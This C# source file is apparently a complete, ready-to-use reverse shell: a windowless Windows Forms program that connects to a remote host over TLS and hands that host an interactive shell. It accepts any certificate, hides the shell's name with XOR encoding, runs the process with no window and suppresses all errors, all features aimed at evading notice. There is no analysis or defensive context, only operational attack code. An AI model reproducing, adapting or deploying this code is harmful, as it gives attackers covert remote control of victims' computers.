using System;
using System.Diagnostics;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;
using System.Threading.Tasks;

namespace ReverseShellGui
{
    internal static class Program
    {
        private static StreamWriter streamWriter;

        [STAThread]
        private static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            Application.Run(new HiddenApplicationContext());
        }

        private class HiddenApplicationContext : ApplicationContext
        {
            public HiddenApplicationContext()
            {
                Task.Run(() => RunReverseShell());
            }

            private async void RunReverseShell()
            {
                try
                {
                    string[] args = Environment.GetCommandLineArgs();
                    if (args.Length < 6) return;

                    string host = args[1];
                    int port = int.Parse(args[2]);
                    string envvar = args[3];
                    string arguments = args[4];
                    int xorkey = int.Parse(args[5]);

                    string command = "";
                    for (int i = 0; i < envvar.Length; i++)
                    {
                        command += (char)(envvar[i] ^ xorkey);
                    }

                    using (TcpClient client = new TcpClient(host, port))
                    using (SslStream sslStream = new SslStream(
                        client.GetStream(),
                        false,
                        new RemoteCertificateValidationCallback(ValidateServerCertificate),
                        null))
                    {
                        sslStream.AuthenticateAsClient(host);

                        streamWriter = new StreamWriter(sslStream, Encoding.UTF8) { AutoFlush = true };

                        streamWriter.Flush();

                        Process process = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = command,              // e.g., "cmd.exe"
                                Arguments = arguments,           // usually empty for interactive cmd
                                UseShellExecute = false,
                                RedirectStandardOutput = true,
                                RedirectStandardError = true,
                                RedirectStandardInput = true,
                                CreateNoWindow = true,
                                WindowStyle = ProcessWindowStyle.Hidden
                            }
                        };

                        process.OutputDataReceived += CmdOutputDataHandler;
                        process.ErrorDataReceived += CmdErrorDataHandler;

                        process.Start();

                        process.BeginOutputReadLine();
                        process.BeginErrorReadLine();

                        // Critical: Full bidirectional reverse shell
                        // Forward input from remote -> process stdin
                        using (StreamReader reader = new StreamReader(sslStream, Encoding.UTF8))
                        {
                            string line;
                            while ((line = await reader.ReadLineAsync()) != null)
                            {
                                // Send the command echo if desired (optional)
                                // await streamWriter.WriteLineAsync(line);

                                process.StandardInput.WriteLine(line);
                                process.StandardInput.Flush();
                            }
                        }

                        // If remote closes, terminate process
                        process.Kill();
                    }
                }
                catch
                {
                    // Silent failure
                }
                finally
                {
                    Application.Exit();
                }
            }
        }

        public static bool ValidateServerCertificate(
            object sender,
            X509Certificate certificate,
            X509Chain chain,
            SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (!string.IsNullOrEmpty(outLine.Data) && streamWriter != null)
            {
                try
                {
                    streamWriter.WriteLine(outLine.Data);
                    streamWriter.Flush();
                }
                catch { }
            }
        }

        private static void CmdErrorDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (!string.IsNullOrEmpty(outLine.Data) && streamWriter != null)
            {
                try
                {
                    streamWriter.WriteLine(outLine.Data);
                    streamWriter.Flush();
                }
                catch { }
            }
        }
    }
}